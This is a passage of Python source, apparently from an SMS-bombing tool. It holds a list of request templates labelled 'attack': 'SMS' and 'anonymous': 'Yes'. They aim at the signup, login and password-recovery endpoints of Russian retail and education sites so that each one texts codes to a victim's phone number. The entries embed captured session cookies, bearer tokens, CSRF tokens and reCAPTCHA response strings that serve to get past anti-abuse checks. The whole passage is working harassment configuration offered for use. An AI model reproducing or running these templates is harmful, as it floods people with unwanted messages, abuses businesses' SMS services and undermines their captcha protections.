            'headers': {'authority': 'www.rigla.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'authorization': 'Bearer tcf5k9a8u7gfyr22c28qu29qq4qhxbu6', 'content-type': 'application/json', 'cookie': '_gcl_au=1.1.1107628409.1679478602; _ym_uid=1679478602779980901; _ym_d=1679478602; _gid=GA1.2.1314938151.1679478602; _ym_visorc=b; mindboxDeviceUUID=3f076512-e2b2-49d7-8c21-6d47ca51c4e9; directCrm-session=%7B%22deviceGuid%22%3A%223f076512-e2b2-49d7-8c21-6d47ca51c4e9%22%7D; _ym_isad=1; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; ACTIVE_CITY=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; ACTIVE_REGION=%7B%22region_id%22%3A77%2C%22region_name%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%7D; mobileAppDownloadViewed=true; RIGLA_WEB_SESSION_GUID=315a9859-c085-4dd0-8b16-15c7a7144a89; quoteId=825c21a2e57cea1246ce34d65d556f4c; gtm_url_params={"utm_source":"admitad","utm_medium":"cpa","utm_campaign":"701280","utm_term":"|UIDG39oNj","tagtag_uid":"1b606280f9c6b09840da8dd98ccf2798"}; gtm_source=admitad; gtm_medium=cpa; gtm_campaign=701280; gtm_content=undefined; gtm_term=|UIDG39oNj; tmr_lvid=b3d1fe26b1352d86be7b7dc9b5509006; tmr_lvidTS=1679478606671; tagtag_aid=1b606280f9c6b09840da8dd98ccf2798; tagtag_aid=1b606280f9c6b09840da8dd98ccf2798; tagtag_aid=1b606280f9c6b09840da8dd98ccf2798; tt_deduplication_cookie=adm; tt_deduplication_cookie=adm; tt_deduplication_cookie=adm; _ga_4Q3L9XF45P=GS1.1.1679478604.1.1.1679478609.55.0.0; _ga=GA1.2.137288771.1679478602; tmr_detect=0%7C1679478618204; regionSuggested=1; private_content_version=d30b75a18cb357834c475952c528878e; _gat_UA-37163999-1=1', 'origin': 'https://www.rigla.ru', 'referer': 'https://www.rigla.ru/?utm_source=admitad&utm_medium=cpa&utm_campaign=701280&utm_term=%7CUIDG39oNj&tagtag_uid=1b606280f9c6b09840da8dd98ccf2798', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-app': 'WEB',},
            'json': {'username': f'+{number}', 'type': 'telephone', 'recaptcha': '03AKH6MREI5rHcHBc_MEfclhrqPbZBScqktee_iMCIh8IljFaQnU3UcrAHgiyyqf5veklD_QFvVGDsJOnllB79rtx3Wcx6qP4KJV3WoPrdJj8u6f61fkVynCPPO3pD7Q56G-IFV-6iic9yquLKvrhHJ2Ly49-dQzqnWbuEnwm2AISFZqVSYNzhsXgoia21u5o9VxAfucNOgTiCRakCt5fqLwFEC7XIZAIrvDKZ1qg4aTsRP1biqEzC10Hs4q2ePiGc2qGKJiPTC0JQ-70yO4gLuw9U2jOG7bjVMUu2LRdBrd-Bwh_kBjml374lZnZnxqnXuKnN7RozwPbd-Seys_PQHgxPFvTpt1oMU1Mb3T3F1TfV9P1R1DKXPWQ4_oc6CRV_NJ5OMO7FAmSAggGBix-yG7IRqeTYYgg2y9GNtUkxA2sf6KygG7F_UK4Zdk28UHFyJpue5wuIQbBmMXWJ8sF8SHQTJf9XBjDcjAWSpqcUSm1gbPWNhOtH-z76xRVGtsZAggyNm4IKlkGx',},
            # Восстановление пароля по смс коду (если акк есть)
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'TechPort.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.techport.ru/registration',
            'cookies': {'sessuid': '30394d48c34eeeb523a3e502d1501426', 'city_id_po': '1', 'city_id_po_kladr': '7700000000000', 'nusc': 'MSK', '_gcl_au': '1.1.1211051032.1679643563', 'ucuid': '-643920304.-1340649836.1476114220.-448013012', 'ucsuid': '-529392969.-1948777454.-1786907221.-1451812897', '_ym_uid': '1679643563530586226', '_ym_d': '1679643563', '_ga': 'GA1.2.809773530.1679643563', '_gid': 'GA1.2.1910866537.1679643563', 'tmr_lvid': 'c244c93b476e57cfaf4d13f9ac030526', 'tmr_lvidTS': '1679643563513', '_ym_isad': '1', 'tmr_detect': '1%7C1679643563847', 'flocktory-uuid': 'eaa6d200-51d5-47c8-9dea-7221ed70e0b4-6', 'bknd': '6f6'},
            'headers': {'authority': 'www.techport.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.techport.ru', 'referer': 'https://www.techport.ru/?utm_medium=cpc&utm_source=yandex&utm_campaign=nl_brand_search_general_techport_cpc_world|79686576&utm_term=%D1%82%D0%B5%D1%85%D0%BF%D0%BE%D1%80%D1%82&utm_content=k50id|0100000043568860163_43568860163|cid|79686576|gid|5141774819|aid|13589606481|adp|no|pos|premium1|src|search_none|dvc|desktop|dop_0&k50id=0100000043568860163_43568860163&_openstat=ZGlyZWN0LnlhbmRleC5ydTs3OTY4NjU3NjsxMzU4OTYwNjQ4MTt5YW5kZXgudXo6cHJlbWl1bQ&yclid=3853333938039422975', 'sec-ch-ua': '\'Not?A_Brand\';v=\'8\', \'Chromium\';v=\'108\', \'Yandex\';v=\'23\'', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '\'Windows\'', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest'},
            'data': {'aero': '1', 'username': 'User', 'login': f'+{number}', 'password': 'fdsTTcvbghnjk87346', 'subscribe': 'on',},
            'params': {'type': 'false',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'IleDeBeaute.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://iledebeaute.ru/',
            'cookies': {'was_shopper': '0', 'bm_mi': '359EDFDF0F3BD68683AD5B2971CC559F~YAAQHp4QAk+G8hGHAQAAuJgbExMthtmuYqKtApiwUVveVtq4wHfHQZDQ0e33veW16bbYnQ2zYaCiSzpFEgz8KmAuMKp5JWogZhlZMMfAIwhMoZaVrkNuF7TXhTt8/V8aHqS8h8eFvNiIiXdPoXwEyyoxm95UMZyhH9TJeKM3JGpCHOQipmcgBd+liOmMwe/Tyx0HzT8F7OdR7UGd+R10nOm8zTCPkpJLH7IuRH73kzetmXUGONFleDZjrjNBp9w/JOZCrWbD0/Pi+5IXBagR2M7y8ucOMMeKlhdezfMGKGNQzITuOvreKlwvCCL9y4ZgWhc=~1', 'bm_sv': '754E38708BF04151DE3C01DEB96C6E4B~YAAQHp4QAlCG8hGHAQAAuJgbExO4IyYxJm7lzm3PwykPY4BVOfjm67bI+1g3dP/0HJgUwf8ArYLYh+uDn3hsZPhf72JFIlKwXvsAQRWku8Z6bL116wEjPiEFElfCGEhm74EPiO+A7L4H0p2WN8Ux/up+2pqlj31ovEw2pTRLFSNsPrrjo9QBLh7plMP6ypo/KJ4sB1LGCnQshIQAP7Yvw50ay5XkkVm4g8PF50+K3s/5pxSjxctz1xt4YWmqfMw/DQ163w==~1', '_ym_uid': '1679652789470013021', '_ym_d': '1679652789', '_gid': 'GA1.2.403556205.1679652789', '_ga_ZJHHG06EW4': 'GS1.1.1679652788.1.0.1679652788.0.0.0', '_ym_visorc': 'b', 'tmr_lvid': '0862a5fce21c08bcb0d57ef994edbde5', 'tmr_lvidTS': '1679652788788', '_ga': 'GA1.2.501752094.1679652789', '_userGUID': '0:lfmdwiv3:iqvuTJby5q7UeGkiAVHOK_aJrrA17VyX', 'dSesn': '0c3e5033-fbd5-35f9-e501-736f2e74ecd3', '_dvs': '0:lfmdwiv3:X4VWG0yOaZqB12MV638YqdLdmrRWpTnP', 'tmr_detect': '1%7C1679652790842', 'ak_bmsc': '53CD3783E412AEE3FC4E963802A77C42~000000000000000000000000000000~YAAQl/1zPrNY+A+HAQAAzagbExNIiCIIo9pGsGElZTNxGHzNaMOc2w6CvzUX0AoSCIAITMHLpXRJwa7TJ+gqwjNAk92/wLmNUWPSa4GQxsnJl27dzsCRQEb+CnbIQZkv/u64cNIHhN6llkmiazFzLlOpEEzhGg1V+83m5myfMk2JpOFirpDKfXiLYlY3zMFEDB2W2gprBCTuNUoLuIWA5XmNZ6UuvfPnHfVrhlTaxI6WnPcGoAe4/irFr0mxuYvtsLXeIyU7g6GIH/T4ONzvFSyBROPyAOwspZxQ8qPGLNxGXa73mCfdlrSKOPagFgf87uWNJNzPZgaDkUB3VtROM6mCDWxO+p+ZLUTBQ1DGEpd0A0CHCLuSVx7dDIn9Dtx5EIwHzvK1EXafOhfTUHS+q0pW4xT6SBsA+oFtdV8+sCVd', '_ym_isad': '1', 'flocktory-uuid': '5be85ab2-7888-457a-b4d2-d26b31ed8c70-4'},
            'headers': {'authority': 'iledebeaute.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://iledebeaute.ru', 'referer': 'https://iledebeaute.ru/?utm_source=epn&utm_medium=cpo&utm_campaign=4345726&utm_content=42rs0sdtaflj0rke7e0yrsh5a1mzq3he', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'s_login': str(number)[1:], 'm_mail': email(), 's_pass': 'HEZAsrgthj6TES', 'b_accept_privacy_policy': '1', 'b_agree_receive_news': '1', 'g-recaptcha-response': '', 'submit_register': '1', 's_action': 'code_confirm_send',},
            'params': {'utm_source': 'epn', 'utm_medium': 'cpo', 'utm_campaign': '4345726', 'utm_content': '42rs0sdtaflj0rke7e0yrsh5a1mzq3he',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'TVOE.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://tvoe.ru/tvoeloyalty/',
            'cookies': {'PHPSESSID': 'o54ojove690b42evtvss3k5f00k3fpebdqtsnunirtgdpdoj', 'utm_source': 'advcake', 'utm_medium': 'cpa', 'utm_campaign': 'epnbz', 'showcase1': 'old', '_gcl_au': '1.1.2072332045.1679652814', '_ym_uid': '1679652814790609224', '_ym_d': '1679652814', 'tmr_lvid': '8520e60f10e4f2e202d4bab52bb75772', 'tmr_lvidTS': '1679652813590', '_ym_isad': '1', '_ym_visorc': 'b', '_userGUID': '0:lfmdx1oj:wE0h88xot~0v_Qk0Hwh85ducpJIdZ1Vt', 'dSesn': 'f4696d53-15c4-5794-5fab-8e839e33a7c8', '_dvs': '0:lfmdx1oj:0urBZALzsldBeH_9VavcvzPEgW3pFTOb', 'advcake_track_id': 'e5e1bcaf-ec7d-ff1b-d324-0fada7b372e6', 'advcake_session_id': 'e078e18a-ab13-6d29-bde2-b4ab48a19949', 'advcake_track_url': 'https%3A%2F%2Ftvoe.ru%2F%3Futm_source%3Dadvcake%26utm_medium%3Dcpa%26utm_campaign%3Depnbz%26utm_content%3D4345726%26advcake_params%3D42rs0selhill6bt5h3slqvz7ikmphp40', 'advcake_utm_partner': 'epnbz', 'advcake_utm_webmaster': '4345726', 'advcake_click_id': '42rs0selhill6bt5h3slqvz7ikmphp40', 'mindboxDeviceUUID': '43d897a9-da6e-4863-ae12-d3bbb522ef70', 'directCrm-session': '%7B%22deviceGuid%22%3A%2243d897a9-da6e-4863-ae12-d3bbb522ef70%22%7D', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_ga': 'GA1.2.929772587.1679652814', '_gid': 'GA1.2.1295994995.1679652815', 'flocktory-uuid': 'aab46a09-3729-400a-ba22-799f849b792c-4', 'aprt_last_partner': 'actionpay', 'aprt_last_apclick': '', 'aprt_last_apsource': '4345726', 'gru-region-chosen': '1', 'BITRIX_SM_SALE_UID': 'b6937296d003caa33125bacc639a5dca', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1679691540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', '_ym_debug': 'null', 'BX_USER_ID': '4d2e8633001593467d8d9e45eaa77b72', 'tmr_detect': '1%7C1679652844695'},
            'headers': {'authority': 'tvoe.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryR8ztOCSB1VzrCtIk', 'origin': 'https://tvoe.ru', 'referer': 'https://tvoe.ru/tvoeloyalty/?register=yes&backurl=%2Fauth%2F', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundaryR8ztOCSB1VzrCtIk\r\nContent-Disposition: form-data; name="ACTION"\r\n\r\nREGISTER\r\n------WebKitFormBoundaryR8ztOCSB1VzrCtIk\r\nContent-Disposition: form-data; name="NAME"\r\n\r\nUser\r\n------WebKitFormBoundaryR8ztOCSB1VzrCtIk\r\nContent-Disposition: form-data; name="PHONE"\r\n\r\n+{number}\r\n------WebKitFormBoundaryR8ztOCSB1VzrCtIk\r\nContent-Disposition: form-data; name="EMAIL"\r\n\r\n{email()}\r\n------WebKitFormBoundaryR8ztOCSB1VzrCtIk\r\nContent-Disposition: form-data; name="BIRTHDAY"\r\n\r\n1991-11-11\r\n------WebKitFormBoundaryR8ztOCSB1VzrCtIk\r\nContent-Disposition: form-data; name="GENDER"\r\n\r\nM\r\n------WebKitFormBoundaryR8ztOCSB1VzrCtIk\r\nContent-Disposition: form-data; name="AGREEMENT_PERSONAL_DATA"\r\n\r\nY\r\n------WebKitFormBoundaryR8ztOCSB1VzrCtIk\r\nContent-Disposition: form-data; name="Save"\r\n\r\nЗАРЕГИСТРИРОВАТЬСЯ\r\n------WebKitFormBoundaryR8ztOCSB1VzrCtIk--\r\n'.encode(),
            'params': {'register': 'yes', 'backurl': '/auth/',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'LgCity.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://lgcity.ru/ajax/Auth/SmsSend/',
            'cookies': {'PHPSESSID': '6f9a230b592a0c59d67c9a7398c5fa5d', 'BITRIX_SM_SALE_UID': '72fabb8c3b0e6fd66521865ee0b73aea', 'qrator_msid': '1679648536.117.79ZGkmqysmI3jCnw-7psfhtj3s3ft5f37hq6lp5i7rlomnbp7', '_gcl_au': '1.1.1404334215.1679648536', '_ym_uid': '167964853663098189', '_ym_d': '1679648536', '_gid': 'GA1.2.2040650987.1679648536', '_gat_UA-97400312-1': '1', '_gat_UA-97400312-2': '1', '_ga_VNL8C6TDCT': 'GS1.1.1679648536.1.0.1679648536.60.0.0', '_ga': 'GA1.1.947760031.1679648536', 'tmr_lvid': '7f8a5b3bc99b51562732e7e6b170d81c', 'tmr_lvidTS': '1679648536344', 'tmr_detect': '1%7C1679648536988', '_ym_isad': '1', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1679691540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', 'advcake_trackid': '6edee9ec-7d40-421a-72b1-56caff71910b', 'advcake_session_id': '3c87d5f6-b706-5eb4-3407-f3b4a2fcadf3', 'advcake_track_url': 'https%3A%2F%2Flgcity.ru%2Fpersonal%2Fbonus_cart%2F%3Futm_source%3Dladygentleman.com%26utm_medium%3Dreferral%26utm_campaign%3Dinfo', 'advcake_utm_partner': 'info', 'advcake_utm_webmaster': '', 'advcake_click_id': '', 'rrpvid': '98688566285396', '_userGUID': '0:lfmbddye:uIW2w0zMd3nb5iCJD7BI0EvgFIStkCMJ', 'gcui': '', 'gcmi': '', 'gcvi': 'd95PuoIwsdi', 'gcsi': 'KOLRQn8acQw', 'BX_USER_ID': '1fafd3b1232f07e9591f4ed17382d3e6', 'rcuid': '641d671acf40efef1407ce36', 'aprt_last_partner': 'ladygentleman.com', 'flocktory-uuid': '8a8d8400-a2ed-42eb-8e96-70d4426f8403-6', 'X-User-DeviceId': '9aeaa26c-3b92-4ea0-a8c5-cd8fbff96fa2'},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://lgcity.ru', 'Referer': 'https://lgcity.ru/personal/bonus_cart/?utm_source=ladygentleman.com&utm_medium=referral&utm_campaign=info', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '\'Not?A_Brand\';v=\'8\', \'Chromium\';v=\'108\', \'Yandex\';v=\'23\'', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '\'Windows\'', 'x-request-csrf-token': '70d5dffb5aef4f563003d220a8f8fda6'},
            'data': f'sentCode=&phone={number}&code=&smsSubscription=Y',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'ADAMAS.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://rest.adamas.ru/v1/phone/send',
            'headers': {'authority': 'rest.adamas.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'authorization': 'Bearer s41dv-Xod1aTrRQWerwEwZBr8MvKn_pA', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://adamas.ru', 'referer': 'https://adamas.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'phone': int(str(number)[1:]), 'action': 'registration', 'captcha': '03AKH6MRGGQODOCxNf4v0nW-9Z3HC9ESUF5vvn7hMm4wkPvFhU7f2FaXf59ED2qthNnmCucxAmClnnzq2-situsL03sulf17AQZCx-4sfZda5ZVCOm6XR-ynb0xcz-mPr54YLBajI7sDJK3MIaY96OGp738MD4uKFEniEG-ERV0m-8rF0PyyNUPKT45mgKTt3IIpglh9mUK2kC3u5fz0snobJADx_leA_uZjUGIThmN7wvgClPoWDLplXnTg2jrMsbd9jF0LD6M7PApEvFdfy9RMYBu9t-laba9nYZhxbKvncdVYvVVvoVw3YYjnYYD7h14dnCncsj-Qt__q7n9o5u5CLmA4yDvfcf1e0sTZH0BWFrYwETeylblZ36P7EbOx0_nW9O7phoFLtU8-Lqkybr6pGzUrY_dlVmTbiR5QPdXgI6xX54yNOWMkOxB9PHIn_1x3ddGy-NJR1NOUPR4U6_Y2WuM4DAcy7umxurIRg5Nw8NqFX8JtoNTlMQVxtan0B5cgBIHQBL6dBar6w48F0aFtxIPI9vLUKVdw',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'GULLIVER.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.gulliver.ru/local/tools/site.app/action.php',
            'cookies': {'PHPSESSID': 'yd5FYfBfPOBzVa3MmfEpmnOAHzr8JwW6', 'BITRIX_SM_GUEST_ID': '802980', 'BITRIX_SM_SALE_UID': '904ec4fe9785bcc9a90628bf8a5f9ec7', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A11%2C%22EXPIRE%22%3A1679691540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', 'mindboxDeviceUUID': 'bf0958fd-6d41-4610-9c8f-26133f5da540', 'directCrm-session': '%7B%22deviceGuid%22%3A%22bf0958fd-6d41-4610-9c8f-26133f5da540%22%7D', 'advcake_track_id': '3969b927-4620-0e6f-e272-bf1e4c52199c', 'advcake_session_id': 'cd76e179-3b10-a8e5-4859-e9e3cf90f7ba', 'flocktory-uuid': 'ea890258-27c1-4d95-b8e3-878095e8bcc9-7', '_userGUID': '0:lfm8dpxu:hwu_qrjIaH9Lsl7ZrAlUu5LM0psoShdL', '_ym_uid': '1679643514841676619', '_ym_d': '1679643514', 'tmr_lvid': '52ab9cd4d9b3bc7af3e167d881d0d54a', 'tmr_lvidTS': '1679643514266', 'BX_USER_ID': 'f2930b9ec7d809b2cb02246305ab122e', '_ga': 'GA1.1.1297426347.1679643514', '_ym_isad': '1', 'tmr_detect': '1%7C1679643514846', 'mgo_uid': '36e3ib1f6j3oYTlFpaRu', 'BITRIX_SM_LAST_VISIT': '24.03.2023%2012%3A43%3A34', '_ga_J2J8J6STMH': 'GS1.1.1679651009.2.0.1679651047.22.0.0'},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://www.gulliver.ru', 'Referer': 'https://www.gulliver.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '\'Not?A_Brand\';v=\'8\', \'Chromium\';v=\'108\', \'Yandex\';v=\'23\'', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '\'Windows\''},
            'data': f'action=auth%3Asms&phone={number}&token=&registration=1&TYPE=AUTH_SMS',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Skyeng.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://id.skyeng.ru/user-api/v1/auth/one-time-password/by-phone-to-login-or-confirm',
            'cookies': {'_seid': 'c102060a28494d129d2ba59b85ccba00', '_setz': 'Asia/Tashkent', '_seqp': 'utm_source=advcake&utm_medium=cpa&utm_campaign=n_|mas_4345726|ptn_epn|ma_Berezhnoy|own_b2c|chg_affiliate&utm_advcake_params=46rs0rtgrkcigv7fet1wp55v5idoph75&utm_term=46rs0rtgrkcigv7fet1wp55v5idoph75', '_seqp_time': '1679652057', 'session_global': 'oo118dmrb2oqkkd7q4auv6b6rs',},
            'headers': {'authority': 'id.skyeng.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://id.skyeng.ru', 'referer': 'https://id.skyeng.ru/login?skin=skypro&redirect=https%3A%2F%2Fmy.sky.pro%2Fstudent-cabinet%2F%3F_ga%3D2.25428148.846701109.1679652061-1793573269.1679652057', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'csrf': 'a271e81bcc534ed4c.0JLnXysFgmdrPsSuzwHH02W09tCjeXC9hkHO2BlVp6k.mdDQCUhp6FcYbIn09zilug7YjobJEBzNsHeaiXck8dyG3IYIHW_WE0ZQiQ', 'confirm': '1', '_origin_referer': 'https://my.sky.pro/', 'skin': 'skypro', 'phone': f'+{number}',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'SOKOLOV.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://sokolov.ru/api/v4/profile/user/send-code/',
            'cookies': {'guid_city': '0c5b2444-70a0-4932-980c-b4dc0d3f02b5', 'name_city': '%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0', 'guid_region': '0c5b2444-70a0-4932-980c-b4dc0d3f02b5', 'guid_country': '8aa15da9-92a4-4530-ab74-1992c973c539', 'region_timezone': 'UTC%2B3%3A00', 'utm_source': 'admitad_cashback', 'utm_medium': 'cpo', 'utm_content': '1edf807886ab7e80cae0d642f7dacd15', 'utm_campaign': '253174', 'utm_term': '1edf807886ab7e80cae0d642f7dacd15', 'fuser_id': '23e4dc538176398ea58b44f2d4716a8acbc8e71ac412d3e91566f5c1895b16dfa%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22fuser_id%22%3Bi%3A1%3Bs%3A32%3A%22ce2836df45a0a510679e6e1c42ee1b0f%22%3B%7D', 'ab-test-user-id': 'a880d6fa1d423e491800e361dd7a21e42b9657e37b10b19761480b194789c63da%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22ab-test-user-id%22%3Bi%3A1%3Bs%3A32%3A%22116ec5866f957f28d034496bd4767364%22%3B%7D', 'PHPSESSID': 'jkut32ujicme0vo41ei8kpffia', '_csrf': '3328af47598ed277fc52a6ce7a7412376611929be5c692e71c5bd8df6ccd2725a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22m8dGdnTycxMZkYGkJrRlUwfDo2qe5nom%22%3B%7D', '_gcl_au': '1.1.1222926413.1679652067', 'iso_cookie': 'RU', 'UX_utm_source': 'admitad_cashback', 'UX_utm_medium': 'cpo', '_ga_H109E6L7MH': 'GS1.1.1679652067.1.0.1679652067.60.0.0', '_userGUID': '0:lfmdh1u0:FsNK9XiHwytPZ1KtOXmN5Ln8MCJoYdx5', 'dSesn': '6a1b9d12-6c58-d77e-add5-3d18e0309cba', '_dvs': '0:lfmdh1u0:X2vOl4uCYZheHGd78XougLbcLbVuyNOp', 'digi_uc': 'W10=', '_ym_uid': '1679652068595706587', '_ym_d': '1679652068', '_gid': 'GA1.2.599961166.1679652068', '_gat_UA-50519746-1': '1', '_ym_isad': '1', '_ym_visorc': 'w', 'mindboxDeviceUUID': 'fffaa968-cbcf-4e78-abc7-4ddf7a9ad6e3', 'directCrm-session': '%7B%22deviceGuid%22%3A%22fffaa968-cbcf-4e78-abc7-4ddf7a9ad6e3%22%7D', 'tmr_lvid': 'be5511f0e68dd6c5d309bd44a86b8b87', 'tmr_lvidTS': '1679652068612', 'tmr_detect': '1%7C1679652068703', 'stimgs': '{%22sessionId%22:68385946%2C%22didReportCameraImpression%22:false%2C%22newUser%22:true}', 'syte_uuid': 'cc9d9530-ca2a-11ed-9901-f504c05d27ac', 'flocktory-uuid': '20ff5253-f4d8-4bf0-ac73-802c212636c6-4', 'personalisation_session_skus_ls': '{%2268385946%22:[%22null%22]}', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_ga': 'GA1.2.313766225.1679652067', 'inova_p_sid': 'fksodn2_230324030109', 'uxs_uid': 'ce01e020-ca2a-11ed-858b-914126217b01', 'hits_count': '25', '_ga_4W8KQSGYRV': 'GS1.1.1679652068.1.0.1679652071.57.0.0'},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/vnd.api+json', 'Origin': 'https://sokolov.ru', 'Referer': 'https://sokolov.ru/jewelry-catalog/?utm_source=admitad_cashback&utm_medium=cpo&utm_campaign=253174&utm_content=1edf807886ab7e80cae0d642f7dacd15&utm_term=1edf807886ab7e80cae0d642f7dacd15', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Source': 'site', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': '{"data":{"type":"login","attributes":{"phone":"' + str(number) + '"}}}',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Labirint.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.labirint.ru/post.php',
